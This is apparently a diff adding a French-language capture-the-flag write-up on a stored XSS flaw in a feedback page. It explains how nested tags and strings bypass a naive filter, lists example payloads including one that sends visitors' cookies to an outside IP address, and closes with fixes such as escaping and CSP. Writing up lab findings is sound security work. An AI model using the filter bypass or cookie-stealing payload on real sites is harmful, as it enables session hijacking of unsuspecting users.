@@ -1,0 +1,32 @@
+
+Faille identifiée : Cross-Site Scripting (XSS)
+
+
+Page : /?page=feedback
+
+
+Description :
+	Le site possède une page de feedback où les utilisateurs peuvent soumettre des commentaires.
+	Cependant, les feedbacks soumis sont ajoutés à la page sans être correctement échappés ou filtrés.
+	En effet, le site supprime le caractère < dans le champ message, mais pas dans le champ name.
+	Par contre, les balises <script> et la chaîne "http(s)" sont supprimées dans les deux champs.
+	Mais cela peut être contourné car le serveur fait une simple recherche et suppression de ces chaînes.
+	On peut alors utiliser le fait que toutes les balises <script> vont être supprimées du champ name pour écrire un texte qui sera transformé en balise <script> après la suppression.
+	Exemple : <scr<script>ipt>
+	Cela permet à un attaquant d'injecter du code HTML/JavaScript malveillant qui sera exécuté dans le navigateur des autres utilisateurs visitant la page de feedback.
+
+
+Exemples :
+	<script<script>>fetch('http:/http:///83.114.209.238:4221?cookie='+document.cookie);</script<script>>
+	<iframe height="1400" width="1400" src="https:/https:///codepen.io/gdube/full/JybxxZ?animations=run"></iframe>
+	<script<script>>window.location.href="https:/https:///youtu.be/dQw4w9WgXcQ";</script<script>>
+
+
+Exploitation :
+	Pour récupérer le flag (le site est un peu buggé), il suffit d'écrire "script" dans le champ name et ce que l'on veut dans le champ message,
+	et le flag apparaîtra dans la page.
+
+
+Correctif :
+	- Échapper/encoder correctement les entrées utilisateur avant de les réinjecter dans du HTML (ex. utiliser htmlspecialchars en PHP).
+	- Mettre en place une Content Security Policy (CSP) pour limiter l’exécution de scripts inline.
